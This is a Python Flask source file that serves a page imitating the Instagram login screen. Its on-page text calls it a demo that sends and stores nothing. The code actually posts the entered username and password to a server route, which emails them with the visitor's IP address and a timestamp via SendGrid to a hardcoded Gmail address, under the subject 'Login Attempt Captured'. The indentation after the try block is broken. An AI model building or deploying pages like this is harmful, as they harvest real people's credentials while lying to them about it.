from flask import Flask, request
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail, Email, To, Content
from datetime import datetime, timezone
import os
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Inline HTML for root route to avoid template path issues
INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Clone</title>
    <style>
        body { background-color: #000; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        h1 { font-size: 2.5em; color: #e1306c; }
        form { margin-top: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 5px; background-color: #262626; color: #fff; }
        button { background-color: #0095f6; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
        button:hover { background-color: #007bb5; }
        .or { display: flex; align-items: center; justify-content: center; margin: 10px 0; }
        .or hr { flex-grow: 1; border: none; border-top: 1px solid #fff; margin: 0 10px; }
        .facebook { color: #0095f6; margin: 10px 0; }
        a { color: #0095f6; text-decoration: none; margin: 10px 0; display: block; }
        .app-links { margin-top: 20px; }
        .app-links img { width: 120px; margin: 0 5px; }
        #demoPopup { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #000; padding: 20px; border: 1px solid #fff; color: #fff; text-align: left; z-index: 1000; }
        #closePopup { float: right; cursor: pointer; font-size: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Instagram</h1>
        <form id="loginForm">
            <input type="text" name="username" placeholder="Phone number, username or email address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
        <div class="or">
            <hr><span>OR</span><hr>
        </div>
        <div class="facebook">Log in with Facebook</div>
        <a href="#">Forgot password? Reset</a>
        <a href="#">Don't have an account? Sign up</a>
        <div class="app-links">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/Microsoft_Store_Badge.svg" alt="Microsoft Store">
        </div>
        <p>Demo only — this page does not send or store credentials.</p>
    </div>

    <div id="demoPopup">
        <span id="closePopup">&times;</span>
        <h3>Demo submission intercepted</h3>
        <p>This is a local, view-only educational demo. Entered values are shown here for demonstration and not transmitted.</p>
        <p><strong>Username:</strong> <span id="demoUsername"></span></p>
        <p><strong>Password:</strong> <span id="demoPassword"></span></p>
        <p>No data is saved or sent anywhere.</p>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const form = this;
            fetch('/submit', {
                method: 'POST',
                body: new FormData(form)
            })
            .then(response => response.text())
            .then(data => {
                const username = form.querySelector('input[name="username"]').value;
                const password = form.querySelector('input[name="password"]').value;
                document.getElementById('demoUsername').textContent = username;
                document.getElementById('demoPassword').textContent = password;
                document.getElementById('demoPopup').style.display = 'block';
                console.log(data);
            })
            .catch(error => console.error('Error:', error));
        });

        document.getElementById('closePopup').addEventListener('click', function() {
            document.getElementById('demoPopup').style.display = 'none';
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return INDEX_HTML

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username', 'admin')
    password = request.form.get('password', 'ding2')
    ip_address = request.remote_addr if request.remote_addr != '127.0.0.1' else '::1'
    your_email = "tinanshi621@gmail.com"
    sendgrid_api_key = os.getenv('SENDGRID_API_KEY')
    timestamp = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
    body = f"""Login Attempt CapturedTimestamp: {timestamp}
IP Address: {ip_address}
Username: {username}
Password: {password}
This is from your Instagram login clone demo."""
try:
sg = SendGridAPIClient(sendgrid_api_key)
email = Mail(
from_email=Email(your_email),
to_emails=To(your_email),
subject="Login Attempt Captured",
content=Content("text/plain", body)
)
response = sg.send(email)
logger.info(f"Demo email sent successfully! Status: {response.status_code}")
return "Demo submitted successfully! Check your email.", 200
except Exception as e:
logger.error(f"Email sending failed: {str(e)}")
return "Demo submitted! (Email failed—check logs or API key.)", 200
app = app
